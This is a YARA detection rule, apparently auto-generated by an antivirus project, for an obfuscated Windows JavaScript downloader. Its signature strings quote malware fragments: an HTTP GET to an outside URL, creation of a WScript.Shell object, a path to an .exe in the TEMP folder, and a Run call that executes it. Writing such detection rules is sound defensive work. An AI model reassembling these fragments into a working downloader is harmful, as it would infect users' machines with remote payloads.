rule sig_20160401_b9fb0ecb387fabb473401a551e9b04cf {
  meta:
    description = "datamaliciousorder - file 20160401_b9fb0ecb387fabb473401a551e9b04cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "04b4f7fae2571e0e88f88ab2a3af7732d60c3b967dc48bf370ed794e5862b949"

  strings:
    $s1  = "GyUra[ToHop](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var ZldRt = function AtaYm() {return WScript[LbbNx](\"WScript\"+\".Shell\");}(), BdLm = 11;" fullword ascii
    $s3  = "function RahKo(MvPlu, DyOug){HqFuv = HqFuv * 1; return MvPlu - DyOug;};" fullword ascii
    $s4  = "if (GyUra[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "var ZzbKuf = AgIo[\"getUTCMilliseconds\"]();" fullword ascii
    $s6  = "var JlhNry = AgIo[\"getUTCMilliseconds\"]();" fullword ascii
    $s7  = "var SlBy = AgIo[\"getUTCMilliseconds\"]();" fullword ascii
    $s8  = "function AanAph() {return ZldRt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uz07a2sMzB6.ex\" + \"e\";};" fullword ascii
    $s9  = "function AfUze(){return ImdJm + \"\";};" fullword ascii
    $s10 = "function CdfJk() {return ((DuHp == true) && (DuHp == ElGuq)) ? 1 : HqFuv;};" fullword ascii
    $s11 = "function VvsHml(AjvMev) {var ReGo = (1, 2, 3, 4, 5, AjvMev); return ReGo;};" fullword ascii
    $s12 = "ElGuq = true; " fullword ascii
    $s13 = "var DuHp = false;" fullword ascii
    $s14 = "}while (PeLdn);" fullword ascii
    $s15 = "function VjmLb(){return LbbNx;};" fullword ascii
    $s16 = "return RahKo(PboMc, BdlSnh);" fullword ascii
    $s17 = "DuHp = true; " fullword ascii
    $s18 = "function YpEso()" fullword ascii
    $s19 = "function PcjPxi(){return 23;};" fullword ascii
    $s20 = "function ZaUu(XueKe){ZldRt[\"R\"+\"un\"](XueKe, HqFuv, HqFuv);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}